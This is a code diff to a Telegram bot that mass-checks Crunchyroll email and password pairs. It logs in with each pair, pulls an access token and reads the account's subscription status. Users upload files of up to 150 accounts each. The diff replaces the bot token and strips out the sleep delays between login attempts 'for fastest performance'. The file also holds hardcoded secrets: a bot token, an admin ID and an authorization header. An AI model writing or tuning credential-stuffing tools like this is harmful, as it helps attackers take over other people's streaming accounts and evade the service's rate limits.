@@ -5,7 +5,7 @@ import pytz
 import time
 import os
 
-BOT_TOKEN = "7468947655:AAFr8MFQ-ddK_-KKWHpOVq37CXxpr2hi3JY"
+BOT_TOKEN = "7468947655:AAEWQQyCZGLrC2O4fbsyTKEgYidWuZ2hOLk"
 ADMIN_ID = 6652287427
 APPROVED_FILE = "approved_users.txt"
 AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
@@ -47,7 +47,7 @@ async def check_crunchyroll(email, password):
             device_id = login_res.cookies.get("device_id")
             if not device_id:
                 return None
-            await asyncio.sleep(1)
+
             token_headers = {
                 "Authorization": AUTH_HEADER,
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -68,7 +68,7 @@ async def check_crunchyroll(email, password):
             account_id = js.get("account_id")
             if not token or not account_id:
                 return None
-            await asyncio.sleep(1)
+
             sub_headers = {
                 "Authorization": f"Bearer {token}",
                 "Accept": "application/json",
@@ -115,6 +115,7 @@ async def check_crunchyroll(email, password):
             )
         except Exception:
             return None
+
 
 def check_sync(email, password):
     loop = asyncio.new_event_loop()
@@ -239,10 +240,12 @@ Bᴏᴛ Bʏ @Newlester""",
             )
         except Exception:
             pass
-        time.sleep(2)
+        # (REMOVED) time.sleep(2)
+        # For fastest performance, no sleep. If you want minimal cooldown, add small sleep e.g., time.sleep(0.05)
         if checked >= MAX_MASS_CHECK:
             break
     bot.send_message(chat_id, "✅ Mass checking finished (limit 150 accounts per file).", parse_mode="HTML")
 
 print("Bot running.")
 bot.infinity_polling()
+            
